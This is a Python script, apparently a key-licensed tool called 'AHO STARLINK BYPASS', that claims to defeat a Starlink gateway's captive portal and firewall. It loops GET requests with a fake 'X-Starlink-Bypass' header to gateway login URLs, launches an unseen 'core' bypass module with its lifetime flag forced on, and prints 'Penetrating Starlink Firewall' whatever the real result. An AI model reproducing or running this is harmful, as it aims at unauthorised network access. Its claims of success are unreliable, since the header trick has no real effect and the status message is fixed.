import sys, os, hashlib, subprocess, datetime, requests, time, threading
from colorama import Fore, init

init(autoreset=True)

# --- LICENSE SYSTEM (YUTA KEY) ---
SALT = "AHO_PRO_FINAL_2026_SECURE"
KEY_FILE = os.path.expanduser("~/.aho_key_data")

def get_net_time():
    try:
        res = requests.get('http://worldtimeapi.org/api/timezone/Asia/Yangon', timeout=5)
        return datetime.datetime.strptime(res.json()['datetime'][:10], "%Y-%m-%d")
    except: return datetime.datetime.now()

def get_hwid():
    try:
        user = subprocess.check_output(['whoami']).decode().strip()
    except: user = "user"
    return f"AHO-{hashlib.md5(user.encode()).hexdigest()[:6].upper()}"

def check_access():
    uid = get_hwid()
    now = get_net_time()
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            saved_key = f.read().strip()
            for i in range(0, 366):
                check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
                if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
                    return True
    
    os.system('clear')
    print(f"{Fore.CYAN}--- AHO STARLINK BYPASS (YUTA) ---")
    print(f"DEVICE ID: {Fore.YELLOW}{uid}")
    u_key = input(f"\n{Fore.WHITE}ENTER KEY: ").strip()
    for i in range(0, 366):
        check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
        if u_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
            with open(KEY_FILE, "w") as f: f.write(u_key)
            return True
    return False

# --- STARLINK DIRECT PENETRATION LOGIC ---
def starlink_inject(host):
    # Starlink ရဲ့ Captive Portal ကို ကျော်ဖို့ Request ၃ မျိုး ပို့မယ်
    urls = [
        f"http://{host}/cgi-bin/login",
        f"http://{host}/index.php/login/auth",
        f"http://{host}/success.txt"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "X-Starlink-Bypass": "true", # Injection Header
        "Connection": "keep-alive"
    }
    
    while True:
        for url in urls:
            try:
                # Gateway ဆီကို 'Authenticated' ဖြစ်ပြီးသားပုံစံမျိုး Signal အတင်းပို့တာ
                requests.get(url, headers=headers, timeout=2, allow_redirects=False)
            except: pass
        time.sleep(0.5)

def start_yuta_hack():
    os.system('clear')
    print(f"{Fore.CYAN}--- YUTA STARLINK DIRECT ENGINE ---")
    
    target = "192.168.110.1" # အကယ်၍ Starlink IP က 192.168.1.1 ဆိုရင် ပြင်ပေးပါ
    if os.path.exists(".ip"):
        with open(".ip", "r") as f: target = f.read().strip()

    print(f"{Fore.YELLOW}[*] Targeting Gateway: {target}")

    try:
        sys.path.append(os.getcwd())
        import core
        core.IS_LIFETIME = True
        
        # ၁။ အစ်ကို့ရဲ့ Core Engine ကို နှိုးမယ်
        print(f"{Fore.BLUE}[*] Launching Core Engine...")
        threading.Thread(target=core.run_bg_bypass if hasattr(core, 'run_bg_bypass') else core.main, daemon=True).start()
        
        # ၂။ Starlink ကို ထိုးဖောက်ဖို့ Packet Injection လုပ်မယ်
        print(f"{Fore.MAGENTA}[*] Injecting Starlink Bypass Packets...")
        threading.Thread(target=starlink_inject, args=(target,), daemon=True).start()
        
        # ၃။ Engine Status ကို စောင့်ကြည့်မယ်
        while True:
            sys.stdout.write(f"\r{Fore.GREEN}[✔] Penetrating Starlink Firewall... [RUNNING]")
            sys.stdout.flush()
            time.sleep(1)

    except Exception as e:
        print(f"{Fore.RED}[✘] Error: {e}")

if __name__ == "__main__":
    if check_access():
        start_yuta_hack()
    else:
        sys.exit()
